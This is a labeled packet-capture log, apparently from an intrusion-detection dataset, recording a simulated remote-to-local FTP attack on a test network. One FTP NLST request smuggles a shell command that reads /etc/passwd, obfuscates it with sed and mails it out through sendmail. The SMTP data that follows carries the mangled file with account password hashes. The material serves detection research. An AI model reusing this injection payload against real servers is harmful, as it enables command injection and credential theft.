"ncftp"," r2l", "3017727","21:45:13.684523","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [ACK] Seq=1 Ack=165 Win=31744 Len=0"
"ncftp"," r2l", "3017728","21:45:13.684969","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [FIN, ACK] Seq=1 Ack=165 Win=31744 Len=0"
"ncftp"," r2l", "3017729","21:45:13.685370","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [ACK] Seq=165 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017730","21:45:13.692870","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=798 Win=32120 Len=0"
"ncftp"," r2l", "3017731","21:45:13.693085","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=465 Ack=999 Win=31744 Len=0"
"ncftp"," r2l", "3017732","21:45:13.693516","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017733","21:45:13.713049","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=465 Ack=1023 Win=31744 Len=0"
"ncftp"," r2l", "3017734","21:45:13.799260","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fb ANY linux2.eyrie.af.mil"
"ncftp"," r2l", "3017735","21:45:13.800316","172.16.112.20","172.16.114.50","DNS","176","Standard query response 0xf7fb ANY linux2.eyrie.af.mil MX 10 linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.118.20 A 172.16.112.20"
"ncftp"," r2l", "3017736","21:45:14.176937","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,181"
"ncftp"," r2l", "3017737","21:45:14.177717","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fc MX linux2.eyrie.af.mil"
"ncftp"," r2l", "3017738","21:45:14.177876","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017739","21:45:14.178475","172.16.114.50","172.16.118.20","FTP","240","Request: NLST -F /pub/y2kfix/src/`echo -e sed 's\057\134(\w\134)\057--\1341\057g' \057etc\057passwd|sed 's\057:\057KK\057g'|\057usr\057lib\057sendmail lucyj@linux2.eyrie.af.mil">x;. x;rm -f x`""
"ncftp"," r2l", "3017740","21:45:14.179028","172.16.112.20","172.16.114.50","DNS","160","Standard query response 0xf7fc MX linux2.eyrie.af.mil MX 10 linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.118.20 A 172.16.112.20"
"ncftp"," r2l", "3017741","21:45:14.179921","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fd A linux2.eyrie.af.mil"
"ncftp"," r2l", "3017742","21:45:14.180801","172.16.112.20","172.16.114.50","DNS","144","Standard query response 0xf7fd A linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017743","21:45:14.180874","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017744","21:45:14.181232","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017745","21:45:14.181658","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017746","21:45:14.181961","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017747","21:45:14.182403","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "3017748","21:45:14.182630","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [ACK] Seq=1 Ack=1 Win=31744 Len=0"
"ncftp"," r2l", "3017749","21:45:14.186995","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017750","21:45:14.192388","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017751","21:45:14.192639","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017752","21:45:14.193071","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017753","21:45:14.193198","172.16.118.20","172.16.114.50","TCP","63","1305 → 113 [PSH, ACK] Seq=1 Ack=1 Win=32120 Len=9"
"ncftp"," r2l", "3017754","21:45:14.195294","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [FIN, ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017755","21:45:14.195531","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [ACK] Seq=1 Ack=2 Win=31744 Len=0"
"ncftp"," r2l", "3017756","21:45:14.195674","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [FIN, ACK] Seq=1 Ack=2 Win=31744 Len=0"
"ncftp"," r2l", "3017757","21:45:14.196075","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [ACK] Seq=2 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017758","21:45:14.200523","172.16.114.50","172.16.112.20","DNS","86","Standard query 0x6cd7 PTR 20.118.16.172.in-addr.arpa"
"ncftp"," r2l", "3017759","21:45:14.201437","172.16.112.20","172.16.114.50","DNS","175","Standard query response 0x6cd7 PTR 20.118.16.172.in-addr.arpa PTR linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017760","21:45:14.202183","172.16.114.50","172.16.112.20","DNS","79","Standard query 0x6cd8 A linux2.eyrie.af.mil"
"ncftp"," r2l", "3017761","21:45:14.202702","172.16.112.20","172.16.114.50","DNS","144","Standard query response 0x6cd8 A linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017762","21:45:14.202977","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=678 Ack=1106 Win=31744 Len=0"
"ncftp"," r2l", "3017763","21:45:14.203410","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017764","21:45:14.204340","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"ncftp"," r2l", "3017765","21:45:14.207078","172.16.114.50","172.16.118.20","TCP","90","113 → 1305 [PSH, ACK] Seq=1 Ack=10 Win=31744 Len=36"
"ncftp"," r2l", "3017766","21:45:14.207338","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [FIN, ACK] Seq=37 Ack=10 Win=31744 Len=0"
"ncftp"," r2l", "3017767","21:45:14.207565","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [FIN, ACK] Seq=10 Ack=37 Win=32120 Len=0"
"ncftp"," r2l", "3017768","21:45:14.207778","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [ACK] Seq=11 Ack=38 Win=32120 Len=0"
"ncftp"," r2l", "3017769","21:45:14.207848","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [ACK] Seq=38 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017770","21:45:14.208573","172.16.118.20","172.16.114.50","SMTP","138","S: 220 linux2.eyrie.af.mil ESMTP Sendmail 8.8.7/8.8.7; Tue, 6 Apr 1999 21:45:31 -0400"
"ncftp"," r2l", "3017771","21:45:14.209055","172.16.114.50","172.16.118.20","SMTP","78","C: EHLO marx.eyrie.af.mil"
"ncftp"," r2l", "3017772","21:45:14.210024","172.16.118.20","172.16.114.50","SMTP","239","S: 250 linux2.eyrie.af.mil Hello bramy@marx.eyrie.af.mil [172.16.114.50], pleased to meet you | 250 EXPN | 250 VERB | 250 8BITMIME | 250 SIZE | 250 DSN | 250 ONEX | 250 ETRN | 250 XUSR | 250 HELP"
"ncftp"," r2l", "3017773","21:45:14.210963","172.16.114.50","172.16.118.20","SMTP","102","C: MAIL From:<bramy@marx.eyrie.af.mil> SIZE=21709"
"ncftp"," r2l", "3017774","21:45:14.218571","172.16.118.20","172.16.114.50","SMTP","98","S: 250 <bramy@marx.eyrie.af.mil>... Sender ok"
"ncftp"," r2l", "3017775","21:45:14.218937","172.16.114.50","172.16.118.20","SMTP","91","C: RCPT To:<lucyj@linux2.eyrie.af.mil>"
"ncftp"," r2l", "3017776","21:45:14.222744","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=810 Win=32120 Len=0"
"ncftp"," r2l", "3017777","21:45:14.222957","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=678 Ack=1130 Win=31744 Len=0"
"ncftp"," r2l", "3017778","21:45:14.232732","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=314 Ack=110 Win=32736 Len=0"
"ncftp"," r2l", "3017779","21:45:14.252255","172.16.118.20","172.16.114.50","SMTP","103","S: 250 <lucyj@linux2.eyrie.af.mil>... Recipient ok"
"ncftp"," r2l", "3017780","21:45:14.252603","172.16.114.50","172.16.118.20","SMTP","60","C: DATA"
"ncftp"," r2l", "3017781","21:45:14.253724","172.16.118.20","172.16.114.50","SMTP","104","S: 354 Enter mail, end with ." on a line by itself""
"ncftp"," r2l", "3017782","21:45:14.256042","172.16.114.50","172.16.118.20","SMTP","1078","C: DATA fragment, 1024 bytes"
"ncftp"," r2l", "3017783","21:45:14.257456","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017784","21:45:14.258713","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017785","21:45:14.259975","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017786","21:45:14.261243","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017787","21:45:14.262502","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017788","21:45:14.262783","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=5520 Win=32736 Len=0"
"ncftp"," r2l", "3017789","21:45:14.264579","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017790","21:45:14.265840","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017791","21:45:14.267111","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017792","21:45:14.268369","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017793","21:45:14.269630","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017794","21:45:14.272719","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=15740 Win=32736 Len=0"
"ncftp"," r2l", "3017795","21:45:14.274513","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017796","21:45:14.275771","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017797","21:45:14.277033","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017798","21:45:14.278291","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017799","21:45:14.282711","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=21580 Win=32736 Len=0"
"ncftp"," r2l", "3017800","21:45:14.283640","172.16.114.50","172.16.118.20","IMF","713","from: Bram Yves <bramy@marx.eyrie.af.mil>, , --r--o--o--tKK--F--O--r--l--H--s--J--0--v--0--m--t.KK--0KK--0KK--r--o--o--tKK/--r--o--o--tKK/--b--i--n/--b--a--s--h  , --b--i--nKK*KK--1KK--1KK--b--i--nKK/--b--i--nKK  , --d--a--e--m--o--nKK*KK--2KK--2KK--d--a--e--m--o--nKK/--s--b--i--nKK  , --a--d--mKK*KK--3KK--4KK--a--d--mKK/--v--a--r/--a--d--mKK  , --l--pKK*KK--4KK--7KK--l--pKK/--v--a--r/--s--p--o--o--l/--l--p--dKK  , --s--y--n--cKK*KK--5KK--0KK--s--y--n--cKK/--s--b--i--nKK/--b--i--n/--s--y--n--c  , --s--h--u--t--d--o--w--nKK*KK--6KK--0KK--s--h--u--t--d--o--w--nKK/--s--b--i--nKK/--s--b--i--n/--s--h--u--t--d--o--w--n  , --h--a--l--tKK*KK--7KK--0KK--h--a--l--tKK/--s--b--i--nKK/--s--b--i--n/--h--a--l--t  , --m--a--i--lKK*KK--8KK--1--2KK--m--a--i--lKK/--v--a--r/--s--p--o--o--l/--m--a--i--lKK  , --n--e--w--sKK*KK--9KK--1--3KK--n--e--w--sKK/--v--a--r/--s--p--o--o--l/--n--e--w--sKK  , --u--u--c--pKK*KK--1--0KK--1--4KK--u--u--c--pKK/--v--a--r/--s--p--o--o--l/--u--u--c--pKK  , --o--p--e--r--a--t--o--rKK*KK--1--1KK--0KK--o--p--e--r--a--t--o--rKK/--r--o--o--tKK  , --g--a--m--e--sKK*KK--1--2KK--1--0--0KK--g--a--m--e--sKK/--u--s--r/--g--a--m--e--sKK  , --g--o--p--h--e--rKK*KK--1--3KK--3--0KK--g--o--p--h--e--rKK/--u--s--r/--l--i--b/--g--o--p--h--e--r---d--a--t--aKK  , --f--t--pKK*KK--1--4KK--5--0KK--F--T--P --U--s--e--rKK/--h--o--m--e/--f--t--pKK  , --n--o--b--o--d--yKK*KK--9--9KK--9--9KK--N--o--b--o--d--yKK/KK  , --d--j--w--e--b--e--rKK--E--r--q--R--O--6--U--v--i--W--Q--M--YKK--5--0--0KK--5--0--0KK--R--H--S --L--i--n--u--x --U--s--e--rKK/.--s--i--m/--h--o--m--e/--d--j--w--e--b--e--rKK/--b--i--n/--b--a--s--h  , --d--a--n--wKK--n--u--d--p--i--W--b--c--y--I--6--R--QKK--5--0--1KK--5--0--1KK--R--H--S --L--i--n--u--x --U--s--e--rKK/.--s--i--m/--h--o--m--e/--d--a--n--wKK/--b--i--n/--b--a--s--h  , --j--o--e--u--s--e--rKKKK--5--0--2KK--5--0--2KK--R--e--d --H--a--t --L--i--n--u--x --U--s--e--r,,,,KK/--h--o--m--e/--j--o--e--u--s--e--rKK/--b--i--n/--b--a--s--h  , --s--w--e--b--s--t--e--rKK--j--p--W--H--o--f--b--u--G--a--s--7--UKK--5--0--3KK--5--0--4KK--R--H--S --L--i--n--u--x --U--s--e--rKK/.--s--i--m/--h--o--m--e/--s--w--e--b--s--t--e--rKK/--b--i--n/--t--c--s--h  , --j--o--eKK--u--n--2--R--r--7--w--M.--4--b--Z.KK--5--0--4KK--5--0--6KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--j--o--eKK/--b--i--n/--b--a--s--h  , --d--m--c--c--l--u--n--gKK--M--H--z--Y--Z--C--L--3--S--N--v--Y--IKK--5--0--6KK--5--0--7KK--R--H--S --L--i--n--u--x --U--s--e--rKK/.--s--i--m/--h--o--m--e/--d--m--c--c--l--u--n--gKK/--b--i--n/--b--a--s--h  , --w--w--wKK--K--k--a--y--y--O--m--q--m--C--s--U--UKK--5--0--8KK--5--0--9KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--w--w--wKK/--b--i--n/--b--a--s--h  , --s--g--o--r--t--o--nKK/--r--V--Y--q--h--6--C--E--P--6--X--IKK--1--5--5--6--5KK--1--5--5--6--5KK--S--a--m --G--o--r--t--o--nKK/.--s--i--m/--h--o--m--e/--s--g--o--r--t--o--nKK/--b--i--n/--t--c--s--h  , --l--o--w--e--l--lKK--G--f--9--P--Y--Q--H--O/--C--P--A--wKK--5--0--9KK--5--1--1KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--l--o--w--e--l--lKK/--b--i--n/--b--a--s--h  , --s--p--r--i--n--g--e--rKK--t--t--Y--2--V--Q--e--P--I--w--i--V--oKK--5--1--0KK--5--1--2KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--s--p--r--i--n--g--e--rKK/--b--i--n/--b--a--s--h  , --w--i--n--f--r--e--yKK--s--z--H--4--9--3--K--P--q--W--5--w--cKK--5--1--1KK--5--1--3KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--w--i--n--f--r--e--yKK/--b--i--n/--b--a--s--h  , --c--a--r--v--e--yKK--r--8--o--q--0--n--t--C--E--V--o--8--2KK--5--1--2KK--5--1--4KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--c--a--r--v--e--yKK/--b--i--n/--b--a--s--h  , --g--i--t--t--i--n--sKK--H--C--8--C--A--P--v--h--4--c--X--A--gKK--5--1--3KK--5--1--5KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--g--i--t--t--i--n--sKK/--b--i--n/--b--a--s--h  , --c--h--a--r--l--i--eKKKK--5--1--4KK--5--1--6KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--c--h--a--r--l--i--eKK/--b--i--n/--b--a--s--h  , --s--u--p--p--o--r--tKKKK--5--1--5KK--5--1--7KK--R--H--S --L--i--n--u--x --U--s--e--rKK/-"
"ncftp"," r2l", "3017801","21:45:14.300676","172.16.118.20","172.16.114.50","SMTP","98","S: 250 VAA17431 Message accepted for delivery"
"ncftp"," r2l", "3017802","21:45:14.302375","172.16.114.50","172.16.118.20","SMTP","60","C: QUIT"
"ncftp"," r2l", "3017803","21:45:14.303065","172.16.118.20","172.16.114.50","SMTP","98","S: 221 linux2.eyrie.af.mil closing connection"
"ncftp"," r2l", "3017804","21:45:14.303398","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [FIN, ACK] Seq=22245 Ack=501 Win=31744 Len=0"
"ncftp"," r2l", "3017805","21:45:14.303812","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=501 Ack=22246 Win=32735 Len=0"
"ncftp"," r2l", "3017806","21:45:14.304066","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [FIN, ACK] Seq=501 Ack=22246 Win=32736 Len=0"
"ncftp"," r2l", "3017807","21:45:14.304283","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [ACK] Seq=22246 Ack=502 Win=31744 Len=0"
"ncftp"," r2l", "3017808","21:45:15.707368","172.16.112.20","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017809","21:45:15.707837","172.16.112.10","172.16.112.20","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017810","21:45:17.288127","","","LOOP","60","Reply"
"ncftp"," r2l", "3017811","21:45:21.186983","172.16.113.50","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017812","21:45:21.187394","172.16.112.10","172.16.113.50","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017813","21:45:26.254534","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"ncftp"," r2l", "3017814","21:45:26.254755","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"ncftp"," r2l", "3017815","21:45:27.285929","","","LOOP","60","Reply"
"ncftp"," r2l", "3017816","21:45:29.156863","","","CDP","324","Device ID: loud.eyrie.af.mil.eyrie.af.mil  Port ID: Ethernet1  "
"ncftp"," r2l", "3017817","21:45:29.935122","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"ncftp"," r2l", "3017818","21:45:37.283759","","","LOOP","60","Reply"
"ncftp"," r2l", "3017819","21:45:40.317727","172.16.114.50","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017820","21:45:40.318225","172.16.112.10","172.16.114.50","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017821","21:45:45.966467","","","ARP","60","Who has 172.16.112.10? Tell 172.16.114.50"
"ncftp"," r2l", "3017822","21:45:45.966532","","","ARP","42","172.16.112.10 is at 08:00:20:83:4a:82"
"ncftp"," r2l", "3017823","21:45:47.281525","","","LOOP","60","Reply"
"ncftp"," r2l", "3017824","21:45:51.258601","","","ARP","60","Who has 172.16.112.100? Tell 172.16.112.20"
"ncftp"," r2l", "3017825","21:45:53.442940","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017826","21:45:53.443522","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017827","21:45:53.461741","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=152 Ack=811 Win=32120 Len=0"
"ncftp"," r2l", "3017828","21:45:53.471860","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017829","21:45:53.472211","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017830","21:45:53.491729","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=153 Ack=812 Win=32120 Len=0"
"ncftp"," r2l", "3017831","21:45:53.501847","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017832","21:45:53.502198","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017833","21:45:53.521720","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=154 Ack=813 Win=32120 Len=0"
"ncftp"," r2l", "3017834","21:45:53.541832","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017835","21:45:53.542183","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017836","21:45:53.561746","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=155 Ack=814 Win=32120 Len=0"
"ncftp"," r2l", "3017837","21:45:53.573036","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017838","21:45:53.573377","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017839","21:45:53.573724","172.16.114.50","172.16.118.20","FTP","60","Request: QUIT"
"ncftp"," r2l", "3017840","21:45:53.574587","172.16.118.20","172.16.114.50","FTP","68","Response: 221 Goodbye."
"ncftp"," r2l", "3017841","21:45:53.574918","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [FIN, ACK] Seq=684 Ack=1144 Win=31744 Len=0"
"ncftp"," r2l", "3017842","21:45:53.575336","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [ACK] Seq=1144 Ack=685 Win=32735 Len=0"
"ncftp"," r2l", "3017843","21:45:53.575499","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [FIN, ACK] Seq=1144 Ack=685 Win=32736 Len=0"
"ncftp"," r2l", "3017844","21:45:53.575726","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=685 Ack=1145 Win=31744 Len=0"
"ncftp"," r2l", "3017845","21:45:53.591735","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=157 Ack=816 Win=32120 Len=0"
"ncftp"," r2l", "3017846","21:45:53.600931","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017847","21:45:53.611729","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=157 Ack=822 Win=32120 Len=0"
"ncftp"," r2l", "3017848","21:45:56.248246","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"ncftp"," r2l", "3017849","21:45:56.248448","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"ncftp"," r2l", "3017850","21:45:57.279323","","","LOOP","60","Reply"
"ncftp"," r2l", "3017851","21:45:59.028809","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"ncftp"," r2l", "3017852","21:46:03.924553","172.16.112.50","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017853","21:46:03.925022","172.16.112.10","172.16.112.50","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017854","21:46:07.313381","","","LOOP","60","Reply"
"ncftp"," r2l", "3017855","21:46:13.607348","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017856","21:46:13.607734","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017857","21:46:13.626123","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=158 Ack=823 Win=32120 Len=0"
"ncftp"," r2l", "3017858","21:46:13.626305","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017859","21:46:13.626637","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017860","21:46:13.646113","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=159 Ack=824 Win=32120 Len=0"
"ncftp"," r2l", "3017861","21:46:13.656222","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017862","21:46:13.656554","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017863","21:46:13.676110","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=160 Ack=825 Win=32120 Len=0"
"ncftp"," r2l", "3017864","21:46:13.686222","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017865","21:46:13.686553","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017866","21:46:13.706103","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=161 Ack=826 Win=32120 Len=0"
"ncftp"," r2l", "3017867","21:46:13.716222","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017868","21:46:13.716553","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017869","21:46:13.736093","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=162 Ack=827 Win=32120 Len=0"
"ncftp"," r2l", "3017870","21:46:13.746371","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017871","21:46:13.746703","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017872","21:46:13.766108","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=163 Ack=828 Win=32120 Len=0"
"ncftp"," r2l", "3017873","21:46:13.777370","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017874","21:46:13.777719","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017875","21:46:13.781075","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [FIN, ACK] Seq=832 Ack=165 Win=31744 Len=0"
"ncftp"," r2l", "3017876","21:46:13.781474","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=165 Ack=833 Win=32120 Len=0"
"ncftp"," r2l", "3017877","21:46:13.781728","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [FIN, ACK] Seq=165 Ack=833 Win=32120 Len=0"
